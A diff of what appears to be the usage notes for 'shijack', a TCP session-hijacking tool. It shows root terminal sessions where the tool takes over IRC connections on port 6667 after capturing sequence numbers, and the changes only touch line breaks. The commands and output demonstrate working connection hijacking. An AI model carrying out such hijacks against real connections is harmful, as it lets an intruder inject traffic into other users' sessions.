@@ -8,7 +8,9 @@ Local hijacking:
 > tcp4       0      0  203.43.200.22.2493      198.163.216.60.6667    ESTABLISHED
 > (root@inch shijack)# ./shijack-fbsd dc0 203.43.200.22 2493 198.163.216.60 6667
 > Waiting for SEQ/ACK  to arrive from the srcip to the dstip.
-> (To speed things up, try making some traffic between the two, /msg person asdf
+
+(To speed things up, try making some traffic between the two, /msg person asdf
+
 > Got packet! SEQ = 0xa1963181 ACK = 0xd4f7175f
 > Starting hijack session, Please use ^C to terminate.
 > Anything you enter from now on is sent to the hijacked TCP connection.
@@ -25,9 +27,12 @@ Subnet hijacking:
 > ^C
 > 15 packets received by filter
 > 0 packets dropped by kernel
+
 > (root@inch shijack)# ./shijack-fbsd dc0 203.43.200.114 19970 206.221.255.190 6667
 > Waiting for SEQ/ACK  to arrive from the srcip to the dstip.
-> (To speed things up, try making some traffic between the two, /msg person asdf
+
+(To speed things up, try making some traffic between the two, /msg person asdf
+
 > Got packet! SEQ = 0x8054de ACK = 0xaae9d5a3
 > Starting hijack session, Please use ^C to terminate.
 > Anything you enter from now on is sent to the hijacked TCP connection.
